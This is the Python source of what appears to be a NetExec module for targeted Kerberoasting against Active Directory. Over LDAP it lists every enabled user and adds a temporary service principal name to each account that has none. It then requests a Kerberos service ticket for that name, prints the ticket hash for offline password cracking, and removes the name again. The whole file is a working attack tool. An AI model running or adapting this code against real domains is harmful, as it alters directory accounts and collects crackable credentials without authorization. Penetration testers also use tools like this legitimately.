from impacket.ldap import ldap as ldap_impacket
from nxc.helpers.misc import CATEGORY
from nxc.protocols.ldap.kerberos import KerberosAttacks
from nxc.parsers.ldap_results import parse_result_attributes
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import random
import string
import ldap3
import ssl

class NXCModule:
    name = "targeted_kerberoast"
    description = "Targeted Kerberoasting: Set SPN, Roast, Unset SPN"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def options(self, context, module_options):
        self.user = None
        self.spn = None
        if "USER" in module_options:
            self.user = module_options["USER"]
        
        if "SPN" in module_options:
            self.spn = module_options["SPN"]
        else:
            self.spn = "HOST/" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    def on_login(self, context, connection):
        users_to_process = []
        if self.user:
            users_to_process.append(self.user)
        else:
            context.log.display("No USER option specified. Fetching all users...")
            # Filter for enabled users that are people (not computers)
            search_filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            try:
                resp = connection.ldap_connection.search(
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0
                )
                results = parse_result_attributes(resp)
                for entry in results:
                    if "sAMAccountName" in entry:
                        users_to_process.append(entry["sAMAccountName"])
            except ldap_impacket.LDAPSearchError as e:
                context.log.fail(f"Search failed: {e}")
                return

        context.log.display(f"Found {len(users_to_process)} users to process")

        for user in users_to_process:
            self.process_user(context, connection, user)

    def get_ldap3_connection(self, context, connection):
        user = f"{connection.domain}\\{connection.username}"
        password = connection.password
        authentication = ldap3.NTLM

        if not password:
            if connection.nthash:
                password = (connection.lmhash if connection.lmhash else "aad3b435b51404eeaad3b435b51404ee") + ":" + connection.nthash
        
        # Determine if we should use SSL based on the connection port or args
        use_ssl = False
        port = 389
        if hasattr(connection.args, 'port') and connection.args.port == 636:
            use_ssl = True
            port = 636
        
        try:
            server = ldap3.Server(connection.host, get_info=ldap3.ALL, port=port, use_ssl=use_ssl)
            conn = ldap3.Connection(server, user=user, password=password, authentication=authentication, auto_bind=True)
            return conn
        except Exception as e:
            context.log.debug(f"Failed to connect with ldap3: {e}")
            return None

    def process_user(self, context, connection, user):
        # Search for user details using existing connection
        search_filter = f"(&(objectClass=user)(sAMAccountName={user}))"
        try:
            resp = connection.ldap_connection.search(
                searchFilter=search_filter,
                attributes=["distinguishedName", "servicePrincipalName"],
                sizeLimit=1
            )
        except ldap_impacket.LDAPSearchError as e:
            context.log.fail(f"Search failed for {user}: {e}")
            return

        results = parse_result_attributes(resp)
        if not results:
            context.log.fail(f"User {user} not found")
            return
        
        user_entry = results[0]
        dn = user_entry.get("distinguishedName")
        existing_spns = user_entry.get("servicePrincipalName", [])
        if isinstance(existing_spns, str):
            existing_spns = [existing_spns]
        elif isinstance(existing_spns, bytes):
             existing_spns = [existing_spns.decode('utf-8')]

        spn_to_roast = None
        spn_added = False

        if existing_spns:
            context.log.display(f"User {user} already has SPNs: {existing_spns}")
            spn_to_roast = existing_spns[0]
        else:
            context.log.display(f"User {user} has no SPNs. Adding temporary SPN: {self.spn}")
            
            # Use ldap3 for modification
            ldap3_conn = self.get_ldap3_connection(context, connection)
            if not ldap3_conn:
                context.log.fail("Could not establish ldap3 connection for modification")
                return

            try:
                ldap3_conn.modify(dn, {'servicePrincipalName': [(ldap3.MODIFY_ADD, [self.spn])]})
                if ldap3_conn.result['result'] == 0:
                    spn_added = True
                    spn_to_roast = self.spn
                    context.log.success(f"Successfully added SPN {self.spn} to {user}")
                else:
                    context.log.fail(f"Failed to add SPN to {user}: {ldap3_conn.result['description']}")
                    return
            except Exception as e:
                context.log.fail(f"Exception adding SPN to {user}: {e}")
                return
            finally:
                ldap3_conn.unbind()

        if spn_to_roast:
            context.log.display(f"Roasting SPN: {spn_to_roast}")
            try:
                # Request TGS
                # Use connection.host (IP) as kdcHost to avoid DNS resolution issues
                kdc_host = connection.host
                
                userName = Principal(connection.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    clientName=userName,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    aesKey=connection.aesKey,
                    kdcHost=kdc_host
                )
                
                serverName = Principal(spn_to_roast, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                    serverName=serverName,
                    domain=connection.domain,
                    kdcHost=kdc_host,
                    tgt=tgt,
                    cipher=cipher,
                    sessionKey=sessionKey
                )
                
                # Output TGS
                ka = KerberosAttacks(connection)
                tgs_entry = ka.output_tgs(tgs, oldSessionKey, sessionKey, user, spn_to_roast)
                context.log.highlight(tgs_entry)
                
            except Exception as e:
                context.log.fail(f"Failed to roast {user}: {e}")
            finally:
                if spn_added:
                    context.log.display(f"Removing SPN {self.spn} from {user}")
                    ldap3_conn = self.get_ldap3_connection(context, connection)
                    if ldap3_conn:
                        try:
                            ldap3_conn.modify(dn, {'servicePrincipalName': [(ldap3.MODIFY_DELETE, [self.spn])]})
                            if ldap3_conn.result['result'] == 0:
                                context.log.success(f"Successfully removed SPN {self.spn}")
                            else:
                                context.log.fail(f"Failed to remove SPN from {user}: {ldap3_conn.result['description']}")
                        except Exception as e:
                            context.log.fail(f"Exception removing SPN from {user}: {e}")
                        finally:
                            ldap3_conn.unbind()
